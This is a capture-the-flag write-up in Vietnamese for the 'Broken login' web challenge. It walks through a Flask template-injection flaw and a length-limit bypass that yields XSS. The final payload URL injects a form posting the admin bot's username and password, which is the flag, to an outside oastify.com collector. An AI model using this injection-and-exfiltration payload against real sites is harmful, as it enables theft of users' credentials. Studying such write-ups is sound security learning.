# 1. Broken login
Challenge cung cấp source code của file `app.py` và source code của admin bot.

File `app.py`:
```
from flask import Flask, make_response, request, escape, render_template_string

app = Flask(__name__)

fails = 0

indexPage = """...Login form..."""

@app.get("/")
def index():
    global fails
    custom_message = ""

    if "message" in request.args:
        if len(request.args["message"]) >= 25:
            return render_template_string(indexPage, fails=fails)
        
        custom_message = escape(request.args["message"])
    
    return render_template_string(indexPage % custom_message, fails=fails)


@app.post("/")
def login():
    global fails
    fails += 1
    return make_response("wrong username or password", 401)


if __name__ == "__main__":
    app.run("0.0.0.0")
```

Khảo sát website, ta thấy các chức năng:
+) Login form cho phép nhập username và password, sẽ hiển thị "Wrong username or password" cho dù thông tin đăng nhập có là gì chăng nữa.
+) Admin bot sẽ visit URL với domain hợp lệ, điền thông tin username và password vào các ô input rồi submit form. Trong đó, password chính là flag.

Như vậy, ta cần đọc request login do admin bot submit. Đọc file `app.py`, ta thấy tham số `message` được truyền vào template. Thử `/?message={{7*7}}` => có lỗ hổng SSTI, tuy nhiên giới hạn độ dài là 25 nên cần tìm cách bypass.

Để bypass length, ta dùng `/?message={{request.args.a|safe}}&a=abc`, khi đó tham số `a=abc` sẽ được hiển thị và không được escape cẩn thận => XSS => có thể tạo payload khiến Admin Bot execute script.

Payload cuối cùng như sau: `https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=%3Cform+action%3D%22https%3A%2F%2Fuywcqez17hkq9srcsampsedao1urig.oastify.com%2Ftest%22+method%3D%22POST%22%3E%3Cinput+type%3D%22text%22+name%3D%22username%22%3E%3Cinput+type%3D%22text%22+name%3D%22password%22%3E%3Cinput+type%3D%22submit%22+value%3D%22SUBMIT%22%3E%3C%2Fform%3E`
